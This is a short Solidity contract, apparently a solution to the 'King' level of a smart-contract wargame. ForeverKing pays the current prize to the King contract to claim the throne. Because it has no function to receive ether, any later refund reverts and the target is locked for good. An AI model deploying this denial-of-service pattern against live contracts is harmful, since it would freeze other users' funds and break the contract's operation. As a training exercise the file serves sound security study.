// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "./King.sol";

contract ForeverKing{
    King public KingContract;

    constructor(address payable _King) payable {
        KingContract = King(_King);
        
    }

    function Coronation() external{
        uint256 prize = KingContract.prize();
        (bool crowning,) = address(KingContract).call{value: prize}("");
        require(crowning, "failed");
    }

}
